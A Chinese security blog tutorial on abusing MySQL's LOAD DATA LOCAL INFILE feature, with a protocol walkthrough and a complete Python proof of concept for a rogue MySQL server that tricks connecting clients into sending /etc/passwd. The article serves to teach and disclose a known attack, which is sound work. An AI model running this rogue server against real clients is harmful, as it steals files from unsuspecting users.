原创：Kale合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

### 0X00 前言  

### 前言  

实验室的大佬在Tsec分享了一个mysql的议题，正好我对此也有兴趣，所以就写一篇关于mysql攻击链的文章！

注：MySQL相关的学习可到合天网安实验室学习实验——MySQL数据库安全：掌握MySQL数据库的相关安全配置操作

点击：[实验:MySQL数据库安全(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015082709474200001?channelID=)开始操作实验哦（PC端操作最佳哟）

### 0X01正文  

### MySQL LOAD DATA特性  

LOAD DATA语句可以装载服务器主机上的文件，若指定LOCAL关键字，可以装载客户端文件。

还是看官方文档的描述吧

![v2-672d1b15a50b5aab101afdd4e1b6b0d8_hd.j](https://pic1.zhimg.com/80/v2-672d1b15a50b5aab101afdd4e1b6b0d8_hd.jpg)

Mysql官方对在官方文档中已经阐述了LOAD DATA的危害性，并且对LOAD DATA特性的使用做了严格限制，例如secure_file_priv的设置

![v2-fe4778f11bc63fc12594c332778584f9_hd.p](https://pic1.zhimg.com/80/v2-fe4778f11bc63fc12594c332778584f9_hd.png)

secure_file_priv的值为/var/lib/mysql-files/，那么secure_file_priv这里都有什么设置呢

  1. secure_file_priv为null 表示不允许导入导出  

  2. secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹  

  3. secure_file_priv没有设置时，则表示没有任何限制  

对于LOAD DATA我们常用的语句搭配有两个，分别是操作客户端和服务器文件：

load data local infile "文件路径" into table 表名 fields terminated by '分隔符'; load
data infile "文件路径" into table 表名 fields terminated by '分隔符';

第一个语句的意思是读取客户端上的文件并存入相应表中，第二个语句是读取服务器的文件并存入相应表中。我们要关注的是LOAD DATA LOCAL
INFILE，因为利用这个我们可以在一定条件下，实现任意文件读取！

不过，正如前面提到的我们有个secure_file_priv，这个参数会限制我们读取文件的路径，我们首先配置一下它，方便我们稍后操做。

### 协议分析  

环境：ubuntu 16.0.4，mysql 5.7.23

工具：tcpdump

这里使用的抓包命令为：

tcpdump -i lo port 3306 -w mysql.cap -v

mysql客户端与服务器的交互主要分为两个阶段：握手认证阶段和命令执行阶段.

握手为TCP三次握手，这里我们去繁就简，着重分析一下它的命令执行阶段

首先服务器向客户端发送一个Greeting问候包

![v2-2bc8beaaeeb12c359d0ec54acd2291d6_hd.j](https://pic1.zhimg.com/80/v2-2bc8beaaeeb12c359d0ec54acd2291d6_hd.jpg)

主要为mysql和服务器一些banner信息！

然后客户端会发送一个Authentication包，其作用进行登陆请求，发送用户名密码(密码为两层sha1加密)和一些config。

![v2-e84f07c6539820867d37f1a182e3163d_hd.j](https://pic1.zhimg.com/80/v2-e84f07c6539820867d37f1a182e3163d_hd.jpg)

接下来客户端发送的查询包，首先进行的是一些初始化查询！例如：select @@version_comment limit 1

![v2-9cc3b6f3ada8e641fb5911631cecc943_hd.j](https://pic4.zhimg.com/80/v2-9cc3b6f3ada8e641fb5911631cecc943_hd.jpg)

然后是我们的查询包内容load data local infile语句！

![v2-17bac98d9c4942ec4088176b3568f4bb_hd.j](https://pic1.zhimg.com/80/v2-17bac98d9c4942ec4088176b3568f4bb_hd.jpg)

收到我们的Query查询后，服务器会返回一个包含我们请求的文件名的响应包！

![v2-9a1865596b55518d9ccadad08f34f848_hd.j](https://pic1.zhimg.com/80/v2-9a1865596b55518d9ccadad08f34f848_hd.jpg)

最后客户端向服务器发送了一个Response TABULAR 内容为服务器请求文件的内容！

![v2-767198302367da10b4cc9a41a855cecc_hd.j](https://pic1.zhimg.com/80/v2-767198302367da10b4cc9a41a855cecc_hd.jpg)

至此，我们就读取了客户端的文件，并且在无secure_file_priv限制的情况下，我们可以进行任意文件读取!

那么问题来了，我们来再看一下官方文档！

![v2-346772b119ec833f9be36e885c80c6b7_hd.j](https://pic3.zhimg.com/80/v2-346772b119ec833f9be36e885c80c6b7_hd.jpg)

从官方文档，我们可以知道服务器请求客户端文件的时候，并未约定指定文件，在这种情况下服务器只需要提供文件名，就可以读取客户端的任意文件，如果我们构造一个恶意的服务器，当客户端连接后，我们只需要伪造file
transfer包就可以实现文件读取！当然前提是LOAD DATA LOCAL设置开启。

过程如图所示：

![v2-d1295e2ab9eae506833a5260f41ca3ab_hd.j](https://pic3.zhimg.com/80/v2-d1295e2ab9eae506833a5260f41ca3ab_hd.jpg)

### 搭建恶意的服务端  

搭建恶意服务器需要满足下面三个条件：

  * 首先向 MySQL Client 发送Server Greeting包  

  * 等待Client 端发送一个Query Package包  

  * 然后回复一个file transfer请求，来请求读取文件  

首先，我们要知道如何构造如何构造File Transfer和Server Greeting数据包，在mysql的官方文档上已经给出了数据包的格式。

File Transfer数据包格式：<https://dev.mysql.com/doc/internals/en/com-query-response.html>

我们需要等待一个来自 Client 的查询请求，才能回复服务端的这个读文件的请求。

Greeting数据包格式：<https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake>

### 测试  

### poc  

代码来源：<https://www.vesiluoma.com/abusing-mysql-clients/>

#!/usr/bin/python #coding: utf8 import socket # linux : #filestring =
"/etc/passwd" # windows: #filestring =
"C:\\\Windows\\\system32\\\drivers\\\etc\\\hosts" HOST = "0.0.0.0" # open for
eeeeveryone! ^_^ PORT = 3306 BUFFER_SIZE = 1024 #1 Greeting greeting =
"\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
#2 Accept all authentications authok =
"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00" #3 Payload #数据包长度 payloadlen =
"\x0c" padding = "\x00\x00" payload = payloadlen + padding +
"\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" s =
socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((HOST, PORT))
s.listen(1) while True: conn, addr = s.accept() print 'Connection from:', addr
conn.send(greeting) while True: data = conn.recv(BUFFER_SIZE) print "
".join("%02x" % ord(i) for i in data) conn.send(authok) data =
conn.recv(BUFFER_SIZE) conn.send(payload) print "[*] Payload send!" data =
conn.recv(BUFFER_SIZE) if not data: break print "Data received:", data break #
Don't leave the connection open. conn.close()

Github项目：<https://github.com/allyshka/Rogue-MySql-Server>

### 攻击效果  

这里使用github的项目测试，首先运行脚本如下：

![v2-d38638ed70272483af57c9e0ac336c3d_hd.j](https://pic4.zhimg.com/80/v2-d38638ed70272483af57c9e0ac336c3d_hd.jpg)

![v2-37e5968666d4d7f7cab0e20904d5d289_hd.j](https://pic1.zhimg.com/80/v2-37e5968666d4d7f7cab0e20904d5d289_hd.jpg)

我们可以发现，我们可以实现任意文件读取。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

  

